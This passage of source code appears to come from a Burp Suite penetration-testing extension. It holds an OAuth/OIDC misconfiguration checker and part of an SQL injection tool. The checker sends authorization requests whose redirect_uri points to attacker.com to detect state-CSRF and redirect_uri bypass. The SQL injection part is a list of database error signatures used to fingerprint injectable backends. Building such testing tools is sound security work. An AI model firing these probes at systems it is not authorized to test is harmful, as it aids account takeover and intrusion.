        super(OauthPanel, self).__init__("OAuth/OIDC Misconfiguration", callbacks, helpers)

    def _run_check(self, url, auth_hdrs, out, sf):
        from java.net import URL as _URL
        parsed_url = _URL(url)
        origin = "{}://{}{}".format(
            parsed_url.getProtocol(), parsed_url.getHost(),
            "" if parsed_url.getPort() == -1 else ":{}".format(parsed_url.getPort()))

        _append(out, "[*] Probing OIDC/OAuth discovery endpoints...")
        disc_config = None
        disc_url = None
        for path in _OAUTH_PATHS:
            if sf[0]: break
            ep = origin + path
            try:
                s, h, b = _http(ep, req_headers=auth_hdrs, timeout_ms=10000)
                if s == 200 and ("issuer" in b or "authorization_endpoint" in b):
                    _append(out, "  [+] Discovery doc found: {}".format(ep))
                    disc_config = b
                    disc_url = ep
                    break
            except (RuntimeError, Exception, JavaException):
                pass

        if not disc_config:
            _append(out, "  [~] No OIDC discovery document at common paths.")
            _append(out, "      Provide the authorization endpoint URL directly in the URL field.")
            return

        # Parse key fields from the JSON config
        _append(out, "")
        for field in ["issuer", "authorization_endpoint", "token_endpoint",
                      "response_types_supported", "grant_types_supported",
                      "code_challenge_methods_supported"]:
            import re as _re
            m = _re.search(r'"' + field + r'":\s*"?([^",}\]]+)', disc_config)
            if m:
                _append(out, "  {:<36}: {}".format(field, m.group(1).strip()))

        # Check implicit flow
        if '"token"' in disc_config and "response_types_supported" in disc_config:
            _append(out, "")
            _append(out, "  [VULN] Implicit flow (response_type=token) advertised - tokens in URL fragment")

        # PKCE
        if "code_challenge_methods_supported" not in disc_config:
            _append(out, "  [WARN] PKCE not advertised in discovery - code interception possible")
        elif '"plain"' in disc_config and '"S256"' not in disc_config:
            _append(out, "  [WARN] Only PKCE plain method - S256 downgrade possible")
        else:
            _append(out, "  [OK]   PKCE S256 supported")

        # Extract auth endpoint and test state param
        auth_ep_m = re.search(r'"authorization_endpoint":\s*"([^"]+)"', disc_config)
        if auth_ep_m:
            auth_ep = auth_ep_m.group(1)
            _append(out, "")
            _append(out, "[*] Testing state parameter on: {}".format(auth_ep))
            no_state_url = (auth_ep + ("?" if "?" not in auth_ep else "&") +
                            "response_type=code&client_id=test&redirect_uri=https%3A%2F%2Fattacker.com%2Fcb")
            try:
                s, h, b = _http(no_state_url, req_headers=auth_hdrs, timeout_ms=10000,
                                 follow_redirects=False)
                loc = (h.get("location", "") if hasattr(h, "get") else "") or ""
                _ll = loc.lower()
                # A redirect to a LOGIN/CONSENT page is EXPECTED and not a finding. Only flag when
                # the flow actually COMPLETES to the (attacker) redirect_uri with a code/token but
                # NO state echoed -- that is a real CSRF-on-callback condition.
                _to_attacker = "attacker.com" in _ll
                _has_grant = ("code=" in _ll or "access_token=" in _ll or "id_token=" in _ll)
                if s in (301, 302, 303, 307, 308) and _to_attacker and _has_grant and "state=" not in _ll:
                    _append(out, "  [VULN] Authorization completed to redirect_uri WITHOUT a state param -> CSRF.")
                    _append(out, "         Location: {}".format(loc[:120]))
                    self._log_vuln("OAuth missing-state CSRF (code issued without state)",
                                   no_state_url, method="GET", headers=auth_hdrs)
                elif s in (301, 302, 303, 307, 308) and any(x in _ll for x in
                          ("login", "signin", "sign-in", "authorize", "consent", "auth?")):
                    _append(out, "  [INFO] Authorize endpoint redirected to a login/consent page (EXPECTED).")
                    _append(out, "         Can't confirm state-CSRF without a live login -- manually verify the")
                    _append(out, "         callback rejects a missing/forged 'state'.")
                elif s in (301, 302, 303, 307, 308) and "error" in _ll:
                    _append(out, "  [OK]   Server returned an OAuth error (likely enforces required params).")
                else:
                    _append(out, "  [i]   state test inconclusive (HTTP {}, Location: {}).".format(
                        s, loc[:70] or "-"))
            except (RuntimeError, Exception, JavaException) as e:
                _append(out, "  [!] State test: {}".format(str(e)[:70]))

            # Lightweight redirect_uri bypass probe: does the server 302 to an attacker-controlled
            # redirect_uri (open redirect via OAuth) instead of rejecting it?
            _append(out, "  [*] redirect_uri bypass probe...")
            for _ru_test, _ru_desc in [
                ("https://attacker.com", "unrelated host"),
                ("https://attacker.com/cb", "unrelated host + path"),
            ]:
                if sf[0]:
                    break
                import java.net.URLEncoder as _URLE_OA
                _ru_url = (auth_ep + ("?" if "?" not in auth_ep else "&") +
                           "response_type=code&client_id=test&state=x&redirect_uri=" +
                           _URLE_OA.encode(_ru_test, "UTF-8"))
                try:
                    _rs, _rh, _rb = _http(_ru_url, req_headers=auth_hdrs, timeout_ms=10000,
                                          follow_redirects=False)
                    _rloc = ((_rh.get("location", "") if hasattr(_rh, "get") else "") or "").lower()
                    if _rs in (301, 302, 303, 307, 308) and "attacker.com" in _rloc:
                        _append(out, "  [VULN] redirect_uri NOT validated -- server 302s to {} ({}).".format(
                            _ru_test, _ru_desc))
                        self._log_vuln("OAuth redirect_uri bypass -> {}".format(_ru_test),
                                       _ru_url, method="GET", headers=auth_hdrs)
                    elif "invalid" in (_rb or "").lower() or "redirect_uri" in (_rb or "").lower():
                        _append(out, "  [OK]   redirect_uri '{}' rejected ({}).".format(_ru_test, _ru_desc))
                    else:
                        _append(out, "  [i]   redirect_uri '{}' -> HTTP {} (inconclusive).".format(_ru_test, _rs))
                except (RuntimeError, Exception, JavaException) as _re:
                    _append(out, "  [!] redirect_uri probe: {}".format(str(_re)[:60]))

        _append(out, "")
        _append(out, "[+] OAuth/OIDC probe complete.")


# ===========================================================================
# Tool 17 - SQL Injection
# ===========================================================================
# OrderedDict ensures specific DB signatures are checked before the broad Generic
# catch-all.  "sql syntax" was removed from Generic -- it is a substring of the
# MySQL error "error in your sql syntax" and caused false "Generic" classification.
# IMPORTANT: these are GENUINE DB ERROR-MESSAGE phrases only. Payload-derived
# tokens (gtid_subset, extractvalue(, updatexml(, sqlite_, mssql, pgsql, ...) were
# REMOVED -- they appear in our own injection payloads, so when a payload reflects
# in the page they cause false positives (the classic "always detects SQLite" bug).
# Detection also requires the phrase to be ABSENT from the baseline and from the
# payload itself (see Phase 1), so only a NEW, error-specific phrase confirms.
_SQLI_ERROR_SIGS = OrderedDict([
    ("MySQL",      ["you have an error in your sql syntax",
                    "warning: mysql_", "mysqli_sql_exception",
                    "check the manual that corresponds to your mysql",
                    "valid mysql result", "com.mysql.jdbc.exceptions",
                    "mysql server version for the right syntax"]),
    ("MSSQL",      ["unclosed quotation mark after the character string",
                    "incorrect syntax near", "microsoft ole db provider for sql server",
                    "microsoft sql native client", "odbc sql server driver",
                    "[microsoft][odbc sql server driver]",
                    "conversion failed when converting"]),
    ("PostgreSQL", ["unterminated quoted string at or near", "pg_query(): query failed",
                    "syntax error at or near", "postgresql query failed",
                    "pg::syntaxerror", "org.postgresql.util.psqlexception"]),
    ("Oracle",     ["ora-00907:", "ora-00933:", "ora-01756:", "ora-00942:", "ora-01722:",
                    "ora-00936:", "ora-00921:", "quoted string not properly terminated"]),
    ("SQLite",     ["sqlite3.operationalerror", "unrecognized token:",
                    "sqlite error", "sqlitemanager", "sqlite3::query",
                    "no such column:", "near \"': syntax error"]),
    ("Generic",    ["sqlstate[", "odbc sql", "db2 sql error", "sql syntax error",
                    "syntax error in query expression"]),
])
